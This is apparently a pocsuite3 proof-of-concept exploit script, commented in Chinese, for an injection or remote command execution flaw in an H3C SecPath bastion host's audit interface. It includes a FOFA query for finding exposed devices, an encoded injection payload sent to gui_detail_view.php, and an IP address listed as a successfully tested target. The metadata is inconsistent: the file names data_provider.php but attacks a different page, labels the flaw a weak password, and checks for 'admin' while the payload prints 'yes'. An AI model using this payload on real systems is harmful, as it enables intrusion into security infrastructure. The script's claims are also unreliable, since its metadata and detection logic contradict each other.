from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class H3C_SecParhPOC(POCBase):
    # fofa语句: app="H3C-SecPath-运维审计系统" && body="2018"
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "TOM"  # PoC作者的大名
    vulDate = "2020-07-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-01-13"  # 编写 PoC 的日期
    updateDate = "2022-01-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/grutz/h3c-pt-tools.git"]  # 漏洞地址来源,0day不用写
    name = "H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞"  # PoC 名称
    appPowerLink = "https://www.h3c.com/cn/"  # 漏洞厂商主页地址
    appName = "H3C_SecParh"  # 漏洞应用名称
    appVersion = "全版本"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["https://59.51.42.44:8443"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [requests]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞"""  # 漏洞简要描述
    pocDesc = """/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        cookies = {"PHPSESSID": "jbiie3mt1eml4k22ju1vg0ffl2"}
        headers = {"Cache-Control": "max-age=0",
                   "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip() + "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"  # self.url 就是你指定的-u 参数的值
            response = requests.post(url=url, headers=headers, allow_redirects=False, verify=False, cookies=cookies,
                                     timeout=10)
            if "admin" in response.text:
                result.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(H3C_SecParhPOC)
